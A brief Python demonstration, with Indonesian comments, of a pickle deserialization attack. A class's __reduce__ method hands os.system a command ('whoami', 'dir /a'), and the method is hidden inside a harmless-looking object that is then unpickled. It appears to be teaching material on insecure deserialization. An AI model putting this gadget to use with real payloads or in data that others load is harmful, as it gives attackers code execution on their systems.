import pickle
import os

class ExploitChain:
    def __reduce__(self):
        # Rantai eksploitasi yang kompleks yang menggabungkan beberapa kelas
        return (os.system, ('echo "This is a complex malicious command!" && whoami && dir /a',))

class InnocentClass:
    def __init__(self, data):
        self.data = data

    def display(self):
        print(f"Data: {self.data}")

# Penyerang menyisipkan kelas berbahaya dalam sebuah objek yang sepertinya tidak berbahaya
innocent_object = InnocentClass("This is harmless data")
innocent_object.exploit = ExploitChain()

# Serialize objek yang terlihat tidak berbahaya
serialized_data = pickle.dumps(innocent_object)

# Simulasi deserialisasi dari data yang tidak terpercaya
print("Deserializing seemingly harmless object...")
pickle.loads(serialized_data)  # Ini akan menjalankan rantai eksploitasi kompleks
